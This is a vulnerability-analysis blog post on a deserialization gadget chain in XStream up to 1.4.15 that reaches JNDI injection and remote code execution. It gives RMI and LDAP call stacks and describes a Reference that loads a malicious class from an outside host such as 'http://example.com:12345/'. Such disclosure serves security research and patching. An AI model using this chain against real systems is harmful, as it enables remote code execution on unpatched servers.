---
title: XStream <=1.4.15 Deserialization JNDI Injection
description: I found a chain a year ago, but the repair of several chains and I find the sink point and trigger toString point are different, this should be considered a new CVE, here to share out.
categories:
 - Vulnerability Analysis
tags:
 - XStream
 - Vulnerability Analysis
 - RCE
---


### *Screenshot of the proof of vulnerability recurrence*

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/5eEulOMzcxQqsX8.png)

#### *Scope of Impact*

XStream<=1.4.15

#### *Vulnerability Analysis*

I found a chain a year ago, but the repair of several chains and I find the sink point and trigger toString point are different, this should be considered a new CVE, here to share out.

Review the call stack of CVE-2020-26217

```java
com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap
  java.util.HashMap#put
        java.util.HashMap#hash
            jdk.nashorn.internal.objects.NativeString#hashCode                com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString                com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#get                    com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx#readFrom                        java.io.SequenceInputStream#read(byte[], int, int)                        java.io.SequenceInputStream#nextStream                            javax.swing.MultiUIDefaults.MultiUIDefaultsEnumerator#nextElement                                javax.imageio.spi.FilterIterator#next                                javax.imageio.spi.FilterIterator#advance                                    javax.imageio.ImageIO.ContainsFilter#filter                                        java.lang.ProcessBuilder#start
```

The entry of `hashcode()->toString()` of `jdk.nashorn.internal.objects.NativeString` and the sink point `javax.imageio.ImageIO$ContainsFilter` are added to the blacklist.

But we can reuse `java.io.SequenceInputStream#nextStream` to find the new sink point.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/4nF8ySVZBGHtaJU.png)

#### *RMI*

`com.sun.jndi.rmi.registry.BindingEnumeration`

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/VF52hkdfuHWqjwR.png)

Both `ctx` and `var2` are under our control, so JNDI injection is possible here. However, `ctx` is of type `com.sun.jndi.rmi.registry.RegistryContext`, so we can only hit rmi's JNDI injection.

#### *LDAP*

`com.sun.jndi.ldap.LdapBindingEnumeration#createItem`

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/cjvrhGMS8yfUw21.png)

`DirectoryManager.getObjectInstance` can load malicious classes by passing in `Reference` objects. `var6`, `this.homeCtx, this.homeCtx.envprops, var2` we can control, backtrack a bit to `var4`.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/QI3ZCTUpL7Jh6eF.png)

Following up on `decodeReference`, since var0 in `decodeObject` is under our control, we can finally get the code into the `decodeReference` method, and all the parameters of `new Reference` are under our control, constructing new Reference(`" refClassName", "factoryClassName", "http://example.com:12345/"`) passed into `DirectoryManager.getObjectInstance` to load `http://example.com: 12345/` on the class named `factoryClassName.class,` the malicious code into the static code block can be arbitrary code `execution`.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/rViMpc3ZqhWEwRT.png)

`com.sun.jndi.ldap.LdapBindingEnumeration` directly to `this.data` is not null, so I used `com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl` to indirectly call the `LdapBindingEnumeration#next` method.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/SF3YztL1oMag2P9.png)

#### *Trigger toString()*

Then there is the `toString` entry, and after looking around all the classes for the `hashcode()` method there is no class that can trigger `toString`, as `SerializableConverter` supports calling the `readObject` method, provided the class implements the `java.io. Serializable` interface (properties of classes that do not implement it can still be assigned normally) and are not caught by the previous converter, so we can look for `readObject` methods of all classes.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/9IurUOHykd1TGwB.png)

The more common ones are `javax.management.BadAttributeValueExpException#readObject`, but this class inherits from `Throwable` and will be restocked by the `ThrowableConverter` and cannot be `SerializableConverter` to parse.

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/gXzMPoJc8OneqNm.png)

So we need to find a new class, I found a chain that can be used for Java native deserialization to trigger `toString()`, here is not public, here are a few public CVEs used in the `toString` chain.

```java
java.util.PriorityQueue#readObject        
->java.util.PriorityQueue#heapify                
->java.util.PriorityQueue#siftDown                        
->java.util.PriorityQueue#siftDownUsingComparator                              ->javafx.collections.ObservableList#sorted()#compare()
```

![image.png]({{site.url}}/upload/2021-03-19-Stream-Deserialization-JNDI-Injection/5FWBEkZj8bSacAe.png)

However, this chain can only be used in XStream and not in Java native deserialization, because `javafx.collections.ObservableList`.



#### *Calling the stack*

RMI

```java
java.util.PriorityQueue#readObject    java.util.PriorityQueue#heapify        java.util.PriorityQueue#siftDown            java.util.PriorityQueue#siftDownUsingComparator              javafx.collections.ObservableList#sorted()#compare()                  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString                  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#get                  com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx#readFrom                      java.io.SequenceInputStream#read(byte[], int, int)                      java.io.SequenceInputStream#nextStream                          com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement                              com.sun.jndi.rmi.registry.BindingEnumeration#next                                  RegistryContext.lookup
```

Ldap

```java
java.util.PriorityQueue#readObject    java.util.PriorityQueue#heapify        java.util.PriorityQueue#siftDown            java.util.PriorityQueue#siftDownUsingComparator              javafx.collections.ObservableList#sorted()#compare()                  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString                  com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#get                  com.sun.xml.internal.bind.v2.util.ByteArrayOutputStreamEx#readFrom                     java.io.SequenceInputStream#read(byte[], int, int)                     java.io.SequenceInputStream#nextStream                         com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement                             com.sun.jndi.ldap.AbstractLdapNamingEnumeration#next                                 com.sun.jndi.ldap.LdapBindingEnumeration#createItem                                     javax.naming.spi.DirectoryManager#getObjectInstance
```



#### *Author*

> *Smi1e@*WEBIN.LAB \- DBAPPSecurity

#### *Topic*

#XStream  #RCE #JNDI #Deserialization
